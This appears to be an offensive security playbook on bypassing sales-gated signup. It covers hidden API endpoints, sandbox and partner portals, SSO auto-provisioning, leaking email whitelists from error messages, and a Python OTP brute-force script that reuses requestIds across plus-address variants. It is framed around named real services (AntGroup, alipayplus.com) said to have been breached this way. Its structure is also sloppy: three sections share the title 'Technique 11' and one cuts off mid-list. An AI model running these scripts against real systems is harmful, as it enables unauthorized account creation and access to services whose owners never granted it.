# Registration Bypass Techniques

When a target requires merchant/enterprise signup that is sales-gated (no self-service), use these techniques to obtain authenticated access.

## Detection: Is Registration Actually Gated?

Before investing time in bypasses, confirm the gate:

| Signal | Meaning |
|--------|---------|
| "Contact Sales" button only | Sales-gated, no self-service |
| Form submits but says "We'll be in touch" | Manual approval queue |
| Registration form exists but fails on submit | May be broken/legacy (try API directly) |
| Multiple registration URLs in JS bundles | Alternative paths may exist |
| Partner portal on different subdomain | Separate registration flow |

## Technique 1: Direct API Registration

Registration UIs often call backend APIs. Find and call them directly:

```python
import requests

s = requests.Session()

# 1. Extract registration API from JS bundles or network tab
# Look for: /register, /signup, /merchant/create, /onboard

# 2. Try minimal payload
r = s.post("https://api.target.com/v1/merchant/register", json={
    "email": "test@example.com",
    "password": "Test123!@#"
})
# 400 with field validation = endpoint works, just need right fields
# 401 = needs pre-auth token
# 404 = wrong path
# 200 = registered
print(r.status_code, r.text)
```

## Technique 2: Invite/Referral Links in JS Bundles

Search JS bundles for invite-related paths:

```
/invite/
/referral/
/join/
/register?code=
/signup?ref=
/onboard?token=
```

Also check:
- URL parameters: `inviteCode`, `referralId`, `partnerCode`
- LocalStorage keys referencing invites
- GraphQL mutations: `acceptInvite`, `redeemCode`

## Technique 3: Sandbox/Test Environments

Many payment platforms have sandbox environments with open registration:

```
sandbox.target.com
sandbox-dashboard.target.com
test.target.com
demo.target.com
staging.target.com
developers.target.com/sandbox
```

Sandbox credentials often work on production APIs (shared auth service).
Even if sandboxed, the session cookie/JWT may be valid across environments.

## Technique 4: Partner Portal Registration

Enterprise products often have partner/reseller portals with separate signup:

```
partners.target.com
reseller.target.com
agency.target.com
affiliate.target.com
channel.target.com
```

These may have self-service registration even when the main product doesn't.

## Technique 5: OAuth/SSO Provider Bypass

If the target uses SSO (Google, GitHub, SAML), try:

1. Register via OAuth provider that has open signup
2. Check if the SSO callback creates an account automatically
3. Look for `auto_provision=true` or `jit_provisioning` in SAML metadata
4. Try email domains that match allowed patterns (target's own domain)

## Technique 6: Broken/Legacy Registration Pages

Look for old registration flows that were "removed" but still functional:

```python
# Check wayback machine for old registration URLs
# https://web.archive.org/web/*/target.com/register*

# Try paths from older API versions
paths = [
    "/v1/register",      # v1 may lack the gate
    "/api/register",     # generic path
    "/user/signup",      # alternative naming
    "/merchant/create",  # direct creation
    "/onboarding/start", # onboarding flow
]
```

## Technique 7: Mobile App Registration

Mobile apps sometimes have different registration flows:

1. Decompile APK/IPA — look for registration endpoints
2. Mobile API versions may skip the sales gate
3. Check for `X-App-Version` or `X-Platform: mobile` headers that unlock flows
4. Deep links: `target://register?type=merchant`

## Technique 8: Documentation Leaks

Developer docs often contain registration instructions with test credentials:

```
docs.target.com
developers.target.com
wiki.target.com
confluence.target.com
```

Look for:
- "Getting Started" guides with API keys
- Postman collections with pre-configured auth
- Test merchant IDs in example code
- "Try it" buttons that auto-create sandbox accounts

## Technique 9: Email Domain Tricks

If registration validates email domain:

```python
# Try target's own domain patterns
emails = [
    "test@target.com",
    "dev@target.com",
    "admin@target.com",
    # Subdomain addressing
    "user@mail.target.com",
    # Plus addressing to reuse your email
    "you+merchant@gmail.com",
]
```

### Whitelist Discovery via Error Messages (AntGroup, June 2026)

Send an invalid domain to the registration/sendVerifyCode endpoint — many apps leak the full whitelist in the error:

```python
r = s.post(f"{BASE}/api/v1/entrance/sendVerifyCode", json={"loginId": "test@gmail.com"})
# Response: "Email is not in allowed list: [@alipay.com, @foxmail.com, @126.com, ...]"
```

**Key insight:** Look for FREE public email providers in the whitelist. Chinese services like `@foxmail.com` (Tencent), `@126.com` / `@163.com` (Netease) are commonly whitelisted by Chinese companies for employee personal emails but are fully public and free to register.

**Important:** Disposable email providers (mail.tm, guerrillamail, 1secmail) are almost always blocked. Don't waste time — extract the whitelist first, then use a whitelisted free provider.

## Technique 10: Race Condition on Approval

If registration exists but requires manual approval:

1. Register normally (enter the approval queue)
2. Check if the account is created BEFORE approval
3. Try logging in immediately — some apps create the session pre-approval
4. Check for endpoints that don't verify approval status

## Technique 11: Disposable Email Services (API-based)

When a target accepts any email but you need a throwaway:

```python
import requests

# mail.tm — create temp email + check inbox via API
# 1. Get available domains
domains = requests.get("https://api.mail.tm/domains").json()
domain = domains['hydra:member'][0]['domain']  # e.g. web-library.net

# 2. Create account
r = requests.post("https://api.mail.tm/accounts", json={
    "address": f"pentest_{int(time.time())}@{domain}",
    "password": "SecurePass123!"
})

# 3. Get auth token
token = requests.post("https://api.mail.tm/token", json={
    "address": email, "password": "SecurePass123!"
}).json()['token']

# 4. Check inbox for verification code
import time
for _ in range(6):  # retry 6x with 10s delay
    time.sleep(10)
    msgs = requests.get("https://api.mail.tm/messages",
        headers={"Authorization": f"Bearer {token}"}).json()
    if msgs.get('hydra:member'):
        msg_id = msgs['hydra:member'][0]['id']
        body = requests.get(f"https://api.mail.tm/messages/{msg_id}",
            headers={"Authorization": f"Bearer {token}"}).json()
        print(body.get('text', body.get('html','')))
        break
```

**Known limitations:**
- Many platforms block disposable domains (mail.tm, guerrillamail, 1secmail)
- Ant International/Alipay+ silently accepts but never delivers to disposable domains
- If "Send Code" shows countdown but no email arrives → disposable domain is filtered
- Fallback: use a real email provider (outlook.com, gmail.com)

## Technique 11: Whitelist Enumeration via Error Messages

Registration endpoints that restrict email domains often leak the full whitelist in error responses:

```python
# Send a non-whitelisted email to sendVerifyCode or register
r = s.post(f"{BASE}/sendVerifyCode", json={"loginId": "attacker@gmail.com"})
# Error response leaks: "Email is not in allowed list: [@company.com, @partner.com, @126.com, @foxmail.com]"
```

**What to look for:**
- Free email providers in the whitelist (@126.com, @foxmail.com, @qq.com = Chinese free providers)
- Partner domains that may have weak employee controls
- The whitelist itself is an info disclosure finding (reveals corporate structure)

**Real-world:** AntGroup GenAI Cockpit (June 2026) leaked 27 partner domains including `@foxmail.com` and `@126.com` (free providers) — instant registration bypass.

## Decision Tree

```
Registration gated?
├── Find API endpoint in JS/network
│   ├── API accepts direct registration → use it
│   └── API also gated → continue
├── Sandbox/test environment exists?
│   ├── Open registration → register there
│   ├── Test credentials in docs → use them
│   └── No sandbox → continue
├── Partner/reseller portal exists?
│   ├── Self-service signup → register
│   └── Also gated → continue
├── OAuth/SSO available?
│   ├── Auto-provisions accounts → register via SSO
│   └── Requires pre-existing account → continue
├── Mobile app has different flow?
│   ├── Different API version → try mobile registration
│   └── Same gate → continue
├── Legacy registration page found (Wayback)?
│   ├── Still functional → register
│   └── Broken/removed → continue
└── All paths blocked?
    └── Document as auth wall blocker
    └── Focus on unauthenticated attack surface
    └── Report findings that don't require auth
```

## Technique 11: SPA Backend Discovery (Marmot/TERN Pattern)

When an SPA serves static files from CDN but API calls return OSS errors or HTML:

1. The SPA frontend is on CDN (e.g., `bot.target.com` → `marmot-cloud.com`)
2. The real API backend is on a DIFFERENT subdomain (e.g., `ilmprodmerchant.target.com`)
3. The SPA's TERN gateway proxies `/api/*` internally — direct curl won't work

**Discovery method:** Use browser DevTools/console interception:
```javascript
// In browser console on the SPA:
performance.getEntriesByType('resource')
  .filter(r => r.name.includes('/api/'))
  .map(r => r.name + ' | ' + r.responseStatus)
```

This reveals the actual backend domain the SPA calls. Then curl that domain directly.

**Real-World: AntGroup (June 2026)**
- `bot.alipayplus.com` — SPA on Marmot Cloud CDN, `/api/*` returns OSS XML errors via curl
## Real-World: AntGroup (June 2026)

**antom.com (Failed):**
- dashboard.antom.com → "Contact Sales" only
- developers.alipayplus.com/register → broken page (JS template vars unresolved)
- intl-sea.alipay.com/merchant → redirects to sales form

**alipayplus.com (Succeeded — Techniques 9 + 11):**
- bot.alipayplus.com → SPA with open registration UI
- Disposable emails (mail.tm, guerrillamail) blocked — no code delivered
- Browser network interception → real backend: `ilmprodmerchant.alipayplus.com`
- Sent invalid email → whitelist leaked: 27 domains including `@foxmail.com`, `@126.com`
- `@foxmail.com` is FREE public email → verification code sent successfully
- Full registration chain proven (blocked only by needing real code)

**Lesson:** Don't stop at "disposable emails don't work". Extract the whitelist from error messages, then find free providers in it. Also: SPA frontends hide the real API backend — use browser network tab to discover it.

## Technique 12: OTP Rate Limit Bypass via +Addressing & Cross-Email RequestId

When registration has per-email OTP rate limiting (e.g., 10 attempts), test:

1. **+addressing variants** — does `target+1@domain.com` get its own rate limit?
2. **requestId binding** — is the requestId from sendVerifyCode bound to the email that generated it?
3. **Dot variations** — does `t.arget@domain.com` count as different?

If requestId is NOT email-bound + unlimited variants = **full OTP brute-force**:

```python
# Attack: brute-force 6-digit OTP without receiving the email
BATCH = 9  # leave margin per requestId

# 1. Send code to target (creates a valid code server-side)
s.post(f"{BASE}/sendVerifyCode", json={"loginId": "target@foxmail.com"})

# 2. Get fresh requestIds from +variants (unlimited, 10 attempts each)
for variant in range(100000):
    r = s.post(f"{BASE}/sendVerifyCode", json={"loginId": f"target+{variant}@foxmail.com"})
    req_id = r.json()['data']['requestId']
    
    # 3. Use variant's requestId to brute-force code for BASE email
    for i in range(BATCH):
        code = f"{variant * BATCH + i:06d}"
        r = s.post(f"{BASE}/register", json={
            "loginId": "target@foxmail.com",  # base email!
            "verifyCode": code,
            "requestId": req_id  # from +variant!
        })
        if r.json().get('success'):
            print(f"REGISTERED with code {code}")
            break
```

**Key conditions:**
- `+addressing` accepted as different emails (separate rate limits)
- `requestId` not cryptographically bound to the generating email
- No IP-based rate limiting on register endpoint
- No CAPTCHA on the flow

**Proven on:** AntGroup GenAI Cockpit (June 2026) — 10/10 `+` variants accepted, requestId cross-email reuse confirmed, no IP rate limit after 108 attempts.

**Lesson:** When all registration bypasses fail, maximize the unauthenticated surface. Don't waste hours on the gate — document it and exploit what's accessible. But ALSO check other subdomains in scope for alternative registration paths.
